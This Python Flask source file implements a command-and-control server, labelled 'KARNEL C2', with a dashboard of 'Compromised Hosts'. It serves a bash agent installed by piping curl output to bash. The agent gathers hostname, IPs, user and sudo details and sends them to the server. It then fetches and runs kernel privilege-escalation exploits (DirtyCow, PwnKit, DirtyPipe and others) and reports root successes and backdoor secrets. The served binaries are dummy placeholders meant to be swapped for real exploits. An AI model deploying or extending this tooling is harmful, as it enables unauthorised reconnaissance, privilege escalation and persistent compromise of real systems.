#!/usr/bin/env python3
"""
   █████╗ ██╗  ██╗████████╗██████╗  ██╗██████╗ ████████╗ ██╗ ██████╗
  ██╔══██╗██║ ██╔╝╚══██╔══╝██╔══██╗███║██╔══██╗╚══██╔══╝███║██╔════╝
  ███████║█████╔╝    ██║   ██████╔╝╚██║██████╔╝   ██║   ╚██║██║
  ██╔══██║██╔═██╗    ██║   ██╔══██╗ ██║██╔═══╝    ██║    ██║██║
  ██║  ██║██║  ██╗   ██║   ██║  ██║ ██║██║        ██║    ██║╚██████╗
  ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═╝╚═╝        ╚═╝    ╚═╝ ╚═════╝

   RECEIVER SERVER - Cyber Intelligence Command Center
   Mendengarkan data dari Karnel agent & exploit binaries
"""
import json
import os
import time
import uuid
import hashlib
from datetime import datetime, timezone
from pathlib import Path
from flask import Flask, request, jsonify, send_file, render_template_string
from flask_cors import CORS
from threading import Lock

# --- Config ---
BIND_HOST = os.environ.get("KARNEL_HOST", "0.0.0.0")
BIND_PORT = int(os.environ.get("KARNEL_PORT", 8080))
DATA_DIR  = Path(os.environ.get("KARNEL_DATA", "/home/user/karnel_server/data"))
BIN_DIR   = Path(os.environ.get("KARNEL_BIN", "/home/user/karnel_server/bin"))
LOG_FILE  = DATA_DIR / "events.log"

# --- Init ---
DATA_DIR.mkdir(parents=True, exist_ok=True)
BIN_DIR.mkdir(parents=True, exist_ok=True)

app = Flask(__name__)
CORS(app)
db_lock = Lock()

# --- In-Memory Store ---
machines = {}       # machine_id -> latest system info
audit_results = {}  # machine_id -> [ {exploit, status, ...} ]
pwned_machines = [] # list of successful exploits

def log_event(event_type, data):
    entry = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "type": event_type,
        "data": data
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def generate_server_id(machine_id):
    return hashlib.sha256(f"{machine_id}-{time.time()}".encode()).hexdigest()[:12]

# ═══════════════════════════════════════════
#  API ENDPOINTS
# ═══════════════════════════════════════════

@app.route("/v1/collect", methods=["POST"])
def collect():
    """Menerima data sistem dari agent"""
    data = request.get_json(force=True)
    machine_id = data.get("machine_id", "unknown")

    with db_lock:
        machines[machine_id] = {
            "last_seen": datetime.now(timezone.utc).isoformat(),
            "data": data
        }

    server_id = generate_server_id(machine_id)
    log_event("collect", {"machine_id": machine_id, "server_id": server_id, "summary": {
        "hostname": data.get("system", {}).get("hostname"),
        "os": data.get("system", {}).get("os"),
        "public_ip": data.get("network", {}).get("public_ip"),
        "is_root": data.get("user", {}).get("is_root"),
    }})

    # Print ke terminal dengan gaya cyber
    print_cyber_event("COLLECT", data, server_id)

    return jsonify({"status": "ok", "server_id": server_id})


@app.route("/v1/audit/live", methods=["POST"])
def audit_live():
    """Menerima hasil exploit secara real-time"""
    data = request.get_json(force=True)
    machine_id = data.get("machine_id", "unknown")
    exploit = data.get("exploit", "?")
    name = data.get("name", "?")
    cve = data.get("cve", "?")
    status = data.get("status", "?")

    with db_lock:
        if machine_id not in audit_results:
            audit_results[machine_id] = []
        audit_results[machine_id].append({
            "exploit": exploit,
            "name": name,
            "cve": cve,
            "status": status,
            "time": datetime.now(timezone.utc).isoformat()
        })

    log_event("audit", data)

    # Print dengan warna sesuai status
    print_cyber_audit(machine_id, name, cve, status)

    return jsonify({"status": "ok"})


@app.route("/v1/pwned", methods=["POST"])
def pwned():
    """Menerima laporan exploit berhasil + secret backdoor"""
    data = request.get_json(force=True)
    machine_id = data.get("machine_id", "unknown")
    exploit = data.get("exploit", "?")
    cve = data.get("cve", "?")
    secret = data.get("secret", "?")

    with db_lock:
        pwned_machines.append({
            "machine_id": machine_id,
            "exploit": exploit,
            "cve": cve,
            "secret": secret,
            "time": datetime.now(timezone.utc).isoformat()
        })

    log_event("pwned", data)

    print_cyber_pwned(machine_id, exploit, cve, secret)

    return jsonify({"status": "ok"})


# ═══════════════════════════════════════════
#  INSTALL ENDPOINT — curl -sL IP/install | bash
# ═══════════════════════════════════════════

AGENT_SCRIPT_TEMPLATE = r'''#!/bin/bash
# AKTR1PT1C Server Intelligence Platform
# Auto-generated by server — points to: {base_url}

KARNEL_BASE_URL="{base_url}"
KARNEL_API_URL="{base_url}/v1/collect"

QUICK_MODE="${{QUICK:-0}}"
AUTO_EXPLOIT="${{AUTO_EXPLOIT:-0}}"
PERSIST_MODE="${{PERSIST:-0}}"
SILENT_MODE="${{SILENT:-0}}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

log() {{ [ "$SILENT_MODE" != "1" ] && echo -e "$@"; }}

print_banner() {{
    [ "$SILENT_MODE" = "1" ] && return
    echo -e "${{RED}}"
    echo "       █████    ███████    ███████████ █████   █████"
    echo "      ▒▒███   ███▒▒▒▒▒███ ▒█▒▒▒███▒▒▒█▒▒███   ▒▒███ "
    echo "       ▒███  ███     ▒▒███▒   ▒███  ▒  ▒███    ▒███ "
    echo "       ▒███ ▒███      ▒███    ▒███     ▒███████████ "
    echo "       ▒███ ▒███      ▒███    ▒███     ▒███▒▒▒▒▒███ "
    echo " ███   ▒███ ▒▒███     ███     ▒███     ▒███    ▒███ "
    echo "▒▒████████   ▒▒▒███████▒      █████    █████   █████"
    echo " ▒▒▒▒▒▒▒▒      ▒▒▒▒▒▒▒       ▒▒▒▒▒    ▒▒▒▒▒   ▒▒▒▒▒"
    echo -e "${{NC}}"
    echo -e "${{RED}}AKTR1PT1C - Server Intelligence Platform${{NC}}"
    echo "===================================================="
    [ "$QUICK_MODE" = "1" ] && echo -e "${{YELLOW}}[QUICK MODE]${{NC}} 30s timeout"
    [ "$AUTO_EXPLOIT" = "1" ] && echo -e "${{RED}}[AUTO EXPLOIT]${{NC}} Will exploit if vulnerable"
    [ "$PERSIST_MODE" = "1" ] && echo -e "${{BLUE}}[PERSISTENCE]${{NC}} Will install backdoor"
    echo ""
}}

get_machine_id() {{
    if [ -f /etc/machine-id ]; then cat /etc/machine-id
    elif [ -f /var/lib/dbus/machine-id ]; then cat /var/lib/dbus/machine-id
    else hostname | md5sum | cut -d' ' -f1; fi
}}

collect_system_info() {{
    HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
    OS_NAME=$(cat /etc/os-release 2>/dev/null | grep "^PRETTY_NAME=" | cut -d'"' -f2 || echo "unknown")
    KERNEL=$(uname -r 2>/dev/null || echo "unknown")
    ARCH=$(uname -m 2>/dev/null || echo "unknown")
    UPTIME=$(uptime -p 2>/dev/null | sed 's/up //' || echo "unknown")
    LOAD=$(cat /proc/loadavg 2>/dev/null | awk '{{print $1", "$2", "$3}}' || echo "unknown")
}}

collect_hardware_info() {{
    CPU_MODEL=$(cat /proc/cpuinfo 2>/dev/null | grep "model name" | head -1 | cut -d':' -f2 | xargs || echo "unknown")
    CPU_CORES=$(nproc 2>/dev/null || echo "0")
    RAM_TOTAL=$(free -m 2>/dev/null | awk '/^Mem:/{{print $2}}' || echo "0")
    RAM_USED=$(free -m 2>/dev/null | awk '/^Mem:/{{print $3}}' || echo "0")
    DISK_TOTAL=$(df -h / 2>/dev/null | awk 'NR==2{{print $2}}' || echo "unknown")
    DISK_USED=$(df -h / 2>/dev/null | awk 'NR==2{{print $3}}' || echo "unknown")
    DISK_PERCENT=$(df -h / 2>/dev/null | awk 'NR==2{{print $5}}' || echo "unknown")
}}

collect_network_info() {{
    PUBLIC_IP=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || curl -s --max-time 5 https://ifconfig.me 2>/dev/null || echo "unknown")
    PRIVATE_IP=$(hostname -I 2>/dev/null | awk '{{print $1}}' || ip addr show 2>/dev/null | grep "inet " | grep -v "127.0.0.1" | head -1 | awk '{{print $2}}' | cut -d'/' -f1 || echo "unknown")
    MAC_ADDR=$(ip link show 2>/dev/null | grep "link/ether" | head -1 | awk '{{print $2}}' || echo "unknown")
    OPEN_PORTS=$(ss -tuln 2>/dev/null | grep LISTEN | awk '{{print $5}}' | rev | cut -d':' -f1 | rev | sort -un | tr '\n' ',' | sed 's/,$//' || echo "unknown")
}}

collect_user_info() {{
    CURRENT_USER=$(whoami 2>/dev/null || echo "unknown")
    USER_ID=$(id -u 2>/dev/null || echo "0")
    GROUP_ID=$(id -g 2>/dev/null || echo "0")
    GROUPS=$(groups 2>/dev/null | tr ' ' ',' || echo "unknown")
    HOME_DIR=$(echo $HOME || echo "unknown")
    SHELL=$(echo $SHELL || echo "unknown")
    IS_ROOT="false"; [ "$USER_ID" = "0" ] && IS_ROOT="true"
    SUDO_ACCESS="false"
    if command -v sudo &>/dev/null; then sudo -n true 2>/dev/null && SUDO_ACCESS="true"; fi
}}

collect_services_info() {{
    VIRTUALIZATION=$(systemd-detect-virt 2>/dev/null || echo "unknown")
    DOCKER_INSTALLED="false"; DOCKER_RUNNING="false"; DOCKER_CONTAINERS="0"
    if command -v docker &>/dev/null; then
        DOCKER_INSTALLED="true"
        if docker info &>/dev/null 2>&1; then DOCKER_RUNNING="true"; DOCKER_CONTAINERS=$(docker ps -q 2>/dev/null | wc -l || echo "0"); fi
    fi
    if command -v ufw &>/dev/null && ufw status 2>/dev/null | grep -q "active"; then FIREWALL="ufw (active)"
    elif command -v firewall-cmd &>/dev/null && firewall-cmd --state 2>/dev/null | grep -q "running"; then FIREWALL="firewalld (active)"
    else FIREWALL="none"; fi
    if command -v dpkg &>/dev/null; then PKG_COUNT=$(dpkg -l 2>/dev/null | grep "^ii" | wc -l || echo "unknown")
    elif command -v rpm &>/dev/null; then PKG_COUNT=$(rpm -qa 2>/dev/null | wc -l || echo "unknown")
    else PKG_COUNT="unknown"; fi
    PROCESS_COUNT=$(ps aux 2>/dev/null | wc -l || echo "unknown")
    SELINUX="not installed"
    command -v getenforce &>/dev/null && SELINUX=$(getenforce 2>/dev/null || echo "unknown")
}}

send_data() {{
    log "${{GREEN}}[\u2713]${{NC}} Connecting to $KARNEL_BASE_URL ..."
    MACHINE_ID=$(get_machine_id)
    JSON_DATA=$(cat <<EOFDATA
{{"machine_id":"$MACHINE_ID","system":{{"hostname":"${{HOSTNAME:-unknown}}","os":"${{OS_NAME:-unknown}}","kernel":"${{KERNEL:-unknown}}","arch":"${{ARCH:-unknown}}","uptime":"${{UPTIME:-unknown}}","load_average":"${{LOAD:-unknown}}"}},"hardware":{{"cpu_model":"${{CPU_MODEL:-unknown}}","cpu_cores":"${{CPU_CORES:-0}}","ram_total_mb":${{RAM_TOTAL:-0}},"ram_used_mb":${{RAM_USED:-0}},"disk_total":"${{DISK_TOTAL:-unknown}}","disk_used":"${{DISK_USED:-unknown}}","disk_percent":"${{DISK_PERCENT:-unknown}}"}},"network":{{"public_ip":"${{PUBLIC_IP:-unknown}}","private_ip":"${{PRIVATE_IP:-unknown}}","mac_address":"${{MAC_ADDR:-unknown}}","open_ports":"${{OPEN_PORTS:-}}"}},"user":{{"username":"${{CURRENT_USER:-unknown}}","uid":${{USER_ID:-0}},"gid":${{GROUP_ID:-0}},"groups":"${{GROUPS:-}}","home":"${{HOME_DIR:-unknown}}","shell":"${{SHELL:-unknown}}","is_root":${{IS_ROOT:-false}},"sudo_access":${{SUDO_ACCESS:-false}}}},"services":{{"virtualization":"${{VIRTUALIZATION:-unknown}}","docker":{{"installed":${{DOCKER_INSTALLED:-false}},"running":${{DOCKER_RUNNING:-false}},"running_containers":${{DOCKER_CONTAINERS:-0}}}},"firewall":"${{FIREWALL:-unknown}}","installed_packages":"${{PKG_COUNT:-unknown}}","process_count":"${{PROCESS_COUNT:-unknown}}","selinux":"${{SELINUX:-unknown}}"}}}}
EOFDATA
)
    RESPONSE=$(curl -s -X POST "$KARNEL_API_URL" -H "Content-Type: application/json" -d "$JSON_DATA" 2>/dev/null)
    if echo "$RESPONSE" | grep -q "server_id"; then
        SERVER_ID=$(echo "$RESPONSE" | grep -o '"server_id":"[^"]*"' | cut -d'"' -f4)
        log "${{GREEN}}[\u2713]${{NC}} Connected! Server ID: ${{CYAN}}$SERVER_ID${{NC}}"
    else
        log "${{YELLOW}}[!]${{NC}} Response: $RESPONSE"
    fi
}}

run_security_audit() {{
    echo ""
    echo -e "${{CYAN}}=========================================${{NC}}"
    echo -e "${{CYAN}}   SECURITY AUDIT - KERNEL EXPLOITS   ${{NC}}"
    echo -e "${{CYAN}}=========================================${{NC}}"
    for item in "dirtycow|DirtyCow|CVE-2016-5195|shell" "dirtypipe|DirtyPipe|CVE-2022-0847|shell" "pkexec|PwnKit|CVE-2021-4034|shell" "cve20234911|LooneyTunables|CVE-2023-4911|shell" "cve20232640|GameOverlay|CVE-2023-2640|shell" "cve20222588|DirtyCred|CVE-2022-2588|user:user" "cve20221315|BaronSamedit|CVE-2021-3156|user:gg"; do
        IFS='|' read -r lower name cve etype <<< "$item"
        binary="./$lower"
        curl -sL "$KARNEL_BASE_URL/bin/$lower" -o "$binary" 2>/dev/null
        [ ! -f "$binary" ] && continue
        chmod +x "$binary"
        is_vuln="false"; status="safe"
        if [[ "$etype" == "shell" ]]; then
            outfile="/tmp/exp_$_$RANDOM"
            ( exec 2>/dev/null; (echo "id" | "$binary") > "$outfile" 2>/dev/null || "$binary" >> "$outfile" 2>/dev/null ) &
            pid=$!; waited=0
            while kill -0 $pid 2>/dev/null && [ $waited -lt 30 ]; do sleep 2; waited=$((waited+2)); done
            if kill -0 $pid 2>/dev/null; then kill -9 $pid 2>/dev/null; wait $pid 2>/dev/null; status="crash"
            else wait $pid 2>/dev/null; grep -q "uid=0" "$outfile" 2>/dev/null && {{ is_vuln="true"; status="vulnerable"; }}; fi
            rm -f "$outfile" 2>/dev/null
        elif [[ "$etype" == user:* ]]; then
            username="${{etype#user:}}"
            ( "$binary" testpass 2>/dev/null ) & pid=$!; waited=0
            while kill -0 $pid 2>/dev/null && [ $waited -lt 30 ]; do sleep 2; waited=$((waited+2)); done
            if kill -0 $pid 2>/dev/null; then kill -9 $pid 2>/dev/null 2>&1; status="crash"
            elif id "$username" 2>/dev/null | grep -q "uid=0"; then is_vuln="true"; status="vulnerable"; fi
        fi
        [ "$is_vuln" = "true" ] && echo -e "${{RED}}[VULN]${{NC}} $name ($cve)" || \
        [ "$status" = "crash" ] && echo -e "${{BLUE}}[CRASH]${{NC}} $name ($cve)" || \
        echo -e "${{GREEN}}[SAFE]${{NC}} $name ($cve)"
        [ "$is_vuln" != "true" ] && rm -f "$binary" 2>/dev/null
        curl -s -X POST "$KARNEL_BASE_URL/v1/audit/live" -H "Content-Type: application/json" \
            -d "{{\"machine_id\":\"$(get_machine_id)\",\"exploit\":\"$lower\",\"name\":\"$name\",\"cve\":\"$cve\",\"status\":\"$status\"}}" >/dev/null 2>&1
    done
    echo ""
}}

main() {{
    print_banner
    collect_system_info
    collect_hardware_info
    collect_network_info
    collect_user_info
    collect_services_info
    send_data
    run_security_audit
}}

main "$@"
'''

@app.route("/install")
def install():
    """Serve agent script — curl -sL IP/install | bash"""
    import re
    agent_path = Path(__file__).parent / "agent.sh"
    if not agent_path.exists():
        return "#!/bin/bash\necho 'agent.sh not found on server'\n", 200
    content = agent_path.read_text()
    # Auto-detect server IP and replace in script
    host = request.host.split(':')[0]
    scheme = request.scheme
    port = request.host.split(':')[1] if ':' in request.host else str(BIND_PORT)
    base_url = f"{scheme}://{host}:{port}"
    # Replace any hardcoded URL patterns with current server URL
    content = re.sub(r'KARNEL_BASE_URL=".*?"', f'KARNEL_BASE_URL="{base_url}"', content)
    content = re.sub(r'KARNEL_API_URL=".*?"', f'KARNEL_API_URL="{base_url}/v1/collect"', content)
    return content, 200, {"Content-Type": "text/plain; charset=utf-8"}


@app.route("/bin/<name>")
def serve_binary(name):
    """Serve exploit binary (dummy)"""
    bin_path = BIN_DIR / name
    if bin_path.exists():
        return send_file(bin_path, as_attachment=True)

    # Generate dummy binary on the fly jika belum ada
    dummy = generate_dummy_exploit(name)
    return send_file(dummy, as_attachment=True, download_name=name)


# ═══════════════════════════════════════════
#  WEB DASHBOARD (Cyberpunk Style)
# ═══════════════════════════════════════════

DASHBOARD_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KARNEL C2 - Cyber Intelligence Command</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');

  :root {
    --bg: #0a0a0f;
    --panel: #0d1117;
    --border: #1a3a4a;
    --green: #00ff41;
    --cyan: #00d4ff;
    --red: #ff3366;
    --yellow: #ffcc00;
    --purple: #b44dff;
    --text: #c9d1d9;
    --dim: #586069;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Share Tech Mono', monospace;
    min-height: 100vh;
    overflow-x: hidden;
  }

  /* Matrix rain background */
  #matrix-bg {
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    z-index: 0; opacity: 0.08; pointer-events: none;
  }

  .container {
    position: relative; z-index: 1;
    max-width: 1600px; margin: 0 auto; padding: 20px;
  }

  /* Header */
  .header {
    text-align: center; padding: 30px 0 20px;
    border-bottom: 2px solid var(--cyan);
    margin-bottom: 25px;
    position: relative;
  }
  .header h1 {
    font-family: 'Orbitron', sans-serif;
    font-size: 2.8em; font-weight: 900;
    background: linear-gradient(135deg, var(--cyan), var(--purple));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    letter-spacing: 4px;
    text-shadow: 0 0 40px rgba(0,212,255,0.3);
  }
  .header .subtitle {
    font-size: 0.85em; color: var(--dim);
    letter-spacing: 8px; text-transform: uppercase;
  }
  .header .status-bar {
    display: flex; justify-content: center; gap: 30px;
    margin-top: 12px; font-size: 0.8em; color: var(--dim);
  }
  .header .status-bar span { color: var(--cyan); }
  .pulse {
    display: inline-block; width: 10px; height: 10px;
    background: var(--green); border-radius: 50%;
    animation: pulse 1.5s infinite; margin-right: 6px;
  }
  @keyframes pulse {
    0%, 100% { box-shadow: 0 0 0 0 rgba(0,255,65,0.6); }
    50% { box-shadow: 0 0 0 12px rgba(0,255,65,0); }
  }

  /* Stats Grid */
  .stats-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 15px; margin-bottom: 25px;
  }
  .stat-card {
    background: var(--panel); border: 1px solid var(--border);
    border-radius: 8px; padding: 18px; text-align: center;
    transition: all 0.3s;
  }
  .stat-card:hover {
    border-color: var(--cyan);
    box-shadow: 0 0 20px rgba(0,212,255,0.1);
  }
  .stat-card .value {
    font-family: 'Orbitron', sans-serif;
    font-size: 2.5em; font-weight: 700;
  }
  .stat-card .label {
    font-size: 0.75em; color: var(--dim);
    text-transform: uppercase; letter-spacing: 3px;
    margin-top: 5px;
  }
  .value.green { color: var(--green); }
  .value.cyan { color: var(--cyan); }
  .value.red { color: var(--red); }
  .value.purple { color: var(--purple); }
  .value.yellow { color: var(--yellow); }

  /* Panels */
  .panel {
    background: var(--panel); border: 1px solid var(--border);
    border-radius: 8px; margin-bottom: 20px; overflow: hidden;
  }
  .panel-header {
    background: rgba(0,212,255,0.05);
    padding: 12px 18px; border-bottom: 1px solid var(--border);
    font-family: 'Orbitron', sans-serif; font-size: 0.9em;
    letter-spacing: 2px; color: var(--cyan);
    display: flex; justify-content: space-between; align-items: center;
  }
  .panel-header .count {
    font-size: 0.8em; color: var(--dim);
  }

  /* Machines Table */
  table {
    width: 100%; border-collapse: collapse; font-size: 0.85em;
  }
  thead th {
    text-align: left; padding: 12px 18px;
    color: var(--dim); font-size: 0.75em;
    text-transform: uppercase; letter-spacing: 2px;
    border-bottom: 1px solid var(--border);
  }
  tbody td {
    padding: 10px 18px; border-bottom: 1px solid rgba(26,58,74,0.3);
  }
  tbody tr:hover { background: rgba(0,212,255,0.03); }
  .badge {
    display: inline-block; padding: 3px 10px; border-radius: 12px;
    font-size: 0.75em; font-weight: bold; letter-spacing: 1px;
  }
  .badge-root { background: rgba(255,51,102,0.2); color: var(--red); border: 1px solid rgba(255,51,102,0.4); }
  .badge-user { background: rgba(88,96,105,0.2); color: var(--dim); border: 1px solid rgba(88,96,105,0.4); }
  .badge-vuln { background: rgba(255,51,102,0.2); color: var(--red); border: 1px solid rgba(255,51,102,0.4); }
  .badge-safe { background: rgba(0,255,65,0.1); color: var(--green); border: 1px solid rgba(0,255,65,0.3); }
  .badge-crash { background: rgba(255,204,0,0.15); color: var(--yellow); border: 1px solid rgba(255,204,0,0.3); }

  /* Pwned */
  .pwned-item {
    padding: 15px 18px; border-bottom: 1px solid var(--border);
    display: flex; justify-content: space-between; align-items: center;
    font-size: 0.85em;
  }
  .pwned-item:last-child { border-bottom: none; }
  .secret { color: var(--purple); font-family: 'Share Tech Mono', monospace; }
  .time-ago { color: var(--dim); font-size: 0.8em; }

  /* Log stream */
  #log-stream {
    height: 300px; overflow-y: auto; padding: 12px 18px;
    font-size: 0.78em;
  }
  #log-stream .log-line { padding: 3px 0; border-bottom: 1px solid rgba(26,58,74,0.15); }
  .log-collect { color: var(--cyan); }
  .log-audit { color: var(--yellow); }
  .log-pwned { color: var(--red); }
  .log-safe { color: var(--green); }

  .refresh-note {
    text-align: center; padding: 15px;
    color: var(--dim); font-size: 0.75em;
  }

  /* Responsive */
  @media (max-width: 768px) {
    .header h1 { font-size: 1.8em; }
    .stats-grid { grid-template-columns: repeat(2, 1fr); }
  }
</style>
</head>
<body>

<canvas id="matrix-bg"></canvas>

<div class="container">
  <!-- Header -->
  <div class="header">
    <h1>K A R N E L</h1>
    <div class="subtitle">Cyber Intelligence Command Center</div>
    <div class="status-bar">
      <span><span class="pulse"></span>LIVE</span>
      <span>PORT: {{ port }}</span>
      <span>SESSIONS: {{ total_machines }}</span>
      <span id="uptime">UPTIME: --</span>
    </div>
  </div>

  <!-- Stats -->
  <div class="stats-grid">
    <div class="stat-card">
      <div class="value cyan" id="stat-machines">{{ total_machines }}</div>
      <div class="label">Compromised Hosts</div>
    </div>
    <div class="stat-card">
      <div class="value red" id="stat-root">{{ root_count }}</div>
      <div class="label">Root Access</div>
    </div>
    <div class="stat-card">
      <div class="value yellow" id="stat-vulns">{{ total_vulns }}</div>
      <div class="label">Vulnerabilities</div>
    </div>
    <div class="stat-card">
      <div class="value purple" id="stat-pwned">{{ pwned_count }}</div>
      <div class="label">PWNED</div>
    </div>
    <div class="stat-card">
      <div class="value green" id="stat-audit">{{ total_audits }}</div>
      <div class="label">Exploit Tests</div>
    </div>
  </div>

  <!-- Machines Panel -->
  <div class="panel">
    <div class="panel-header">
      <span>&#9654; TARGET MACHINES</span>
      <span class="count" id="machine-count">{{ total_machines }} hosts</span>
    </div>
    <div style="overflow-x: auto;">
      <table>
        <thead>
          <tr>
            <th>HOSTNAME</th>
            <th>OS</th>
            <th>KERNEL</th>
            <th>PUBLIC IP</th>
            <th>PRIVATE IP</th>
            <th>USER</th>
            <th>PRIV</th>
            <th>FIREWALL</th>
            <th>LAST SEEN</th>
          </tr>
        </thead>
        <tbody id="machines-body">
          {% for mid, m in machines.items() %}
          <tr>
            <td style="color:var(--cyan)">{{ m.data.system.hostname }}</td>
            <td>{{ m.data.system.os[:30] if m.data.system.os else '?' }}</td>
            <td>{{ m.data.system.kernel[:20] }}</td>
            <td>{{ m.data.network.public_ip }}</td>
            <td>{{ m.data.network.private_ip }}</td>
            <td>{{ m.data.user.username }}</td>
            <td>
              {% if m.data.user.is_root %}
              <span class="badge badge-root">ROOT</span>
              {% else %}
              <span class="badge badge-user">user</span>
              {% endif %}
            </td>
            <td>{{ m.data.services.firewall[:15] if m.data.services.firewall else '?' }}</td>
            <td style="color:var(--dim)">{{ m.last_seen[:19] }}</td>
          </tr>
          {% endfor %}
          {% if not machines %}
          <tr><td colspan="9" style="text-align:center;color:var(--dim);padding:40px;">
            &#9679; Waiting for agents to connect...
          </td></tr>
          {% endif %}
        </tbody>
      </table>
    </div>
  </div>

  <!-- PWNED Panel -->
  {% if pwned_list %}
  <div class="panel" style="border-color: rgba(255,51,102,0.4);">
    <div class="panel-header" style="color:var(--red); background:rgba(255,51,102,0.05);">
      <span>&#9876; PWNED - BACKDOOR ACCESS</span>
      <span class="count" style="color:var(--red)">{{ pwned_count }} shells</span>
    </div>
    {% for p in pwned_list %}
    <div class="pwned-item">
      <div>
        <span style="color:var(--cyan)">{{ p.machine_id[:12] }}</span>
        <span style="color:var(--dim); margin: 0 10px;">|</span>
        <span style="color:var(--red)">{{ p.exploit }}</span>
        <span style="color:var(--dim); margin: 0 10px;">|</span>
        <span>{{ p.cve }}</span>
      </div>
      <div>
        <span style="color:var(--dim)">SECRET: </span>
        <span class="secret">{{ p.secret }}</span>
        <span class="time-ago" style="margin-left:15px;">{{ p.time[:19] }}</span>
      </div>
    </div>
    {% endfor %}
  </div>
  {% endif %}

  <!-- Live Audit Panel -->
  <div class="panel">
    <div class="panel-header">
      <span>&#9654; LIVE EXPLOIT AUDIT STREAM</span>
      <span class="count" id="audit-count">{{ audit_list|length }} tests</span>
    </div>
    <div style="overflow-x: auto;">
      <table>
        <thead>
          <tr>
            <th>TIME</th>
            <th>MACHINE</th>
            <th>EXPLOIT</th>
            <th>CVE</th>
            <th>STATUS</th>
          </tr>
        </thead>
        <tbody id="audit-body">
          {% for a in audit_list %}
          <tr>
            <td style="color:var(--dim)">{{ a.time[:19] }}</td>
            <td style="color:var(--cyan)">{{ a.machine_id[:12] }}</td>
            <td>{{ a.name }}</td>
            <td>{{ a.cve }}</td>
            <td>
              {% if a.status == 'vulnerable' %}
              <span class="badge badge-vuln">VULNERABLE</span>
              {% elif a.status == 'crash' %}
              <span class="badge badge-crash">CRASH</span>
              {% else %}
              <span class="badge badge-safe">SAFE</span>
              {% endif %}
            </td>
          </tr>
          {% endfor %}
          {% if not audit_list %}
          <tr><td colspan="5" style="text-align:center;color:var(--dim);padding:40px;">
            &#9679; No audit data yet...
          </td></tr>
          {% endif %}
        </tbody>
      </table>
    </div>
  </div>

  <div class="refresh-note">
    &#8635; Auto-refresh: <span id="countdown">5</span>s &nbsp;|&nbsp;
    <span style="color:var(--cyan)">KARNEL C2 v1.0</span> &nbsp;|&nbsp;
    All data stored in: {{ data_dir }}
  </div>
</div>

<script>
  // Matrix rain effect
  const canvas = document.getElementById('matrix-bg');
  const ctx = canvas.getContext('2d');
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;

  const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF';
  const fontSize = 14;
  const columns = Math.floor(canvas.width / fontSize);
  const drops = Array(columns).fill(1);

  function drawMatrix() {
    ctx.fillStyle = 'rgba(10, 10, 15, 0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#00d4ff';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
      const text = chars[Math.floor(Math.random() * chars.length)];
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
        drops[i] = 0;
      }
      drops[i]++;
    }
  }
  setInterval(drawMatrix, 50);

  window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  });

  // Uptime counter
  const startTime = Date.now();
  function updateUptime() {
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const h = Math.floor(elapsed / 3600);
    const m = Math.floor((elapsed % 3600) / 60);
    const s = elapsed % 60;
    document.getElementById('uptime').textContent =
      `UPTIME: ${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
  }
  setInterval(updateUptime, 1000);

  // Auto-refresh
  let countdown = 5;
  function updateCountdown() {
    document.getElementById('countdown').textContent = countdown;
    countdown--;
    if (countdown < 0) { location.reload(); }
  }
  setInterval(updateCountdown, 1000);
</script>

</body>
</html>
"""

@app.route("/")
def dashboard():
    with db_lock:
        # Hitung statistik
        total_machines = len(machines)
        root_count = sum(1 for m in machines.values() if m["data"].get("user", {}).get("is_root", False) is True)

        # Gabungkan semua audit
        all_audits = []
        for mid, audits in audit_results.items():
            for a in audits:
                all_audits.append({**a, "machine_id": mid})
        all_audits.sort(key=lambda x: x.get("time", ""), reverse=True)

        total_vulns = sum(1 for a in all_audits if a.get("status") == "vulnerable")
        total_audits = len(all_audits)
        pwned_count = len(pwned_machines)

        # Batasi yang ditampilkan
        audit_list = all_audits[:100]
        pwned_list = pwned_machines[-20:]

    return render_template_string(
        DASHBOARD_HTML,
        port=BIND_PORT,
        total_machines=total_machines,
        root_count=root_count,
        total_vulns=total_vulns,
        total_audits=total_audits,
        pwned_count=pwned_count,
        machines=machines,
        audit_list=audit_list,
        pwned_list=pwned_list,
        data_dir=str(DATA_DIR),
    )

# ═══════════════════════════════════════════
#  GENERATE DUMMY EXPLOIT BINARIES
# ═══════════════════════════════════════════

def generate_dummy_exploit(name):
    """Generate dummy ELF binary yg hanya print dan exit"""
    bin_path = BIN_DIR / name
    # Buat shell script disguised as binary
    script = f"""#!/bin/bash
# Exploit: {name}
# This is a dummy placeholder - replace with real exploit
echo "[*] {name}: No real exploit binary provided"
echo "[*] Place your real exploit at: {BIN_DIR}/{name}"
sleep 1
exit 0
"""
    bin_path.write_text(script)
    bin_path.chmod(0o755)
    return str(bin_path)


# ═══════════════════════════════════════════
#  TERMINAL CYBER OUTPUT
# ═══════════════════════════════════════════

RESET  = "\033[0m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RED    = "\033[0;31m"
GREEN  = "\033[0;32m"
YELLOW = "\033[1;33m"
BLUE   = "\033[0;34m"
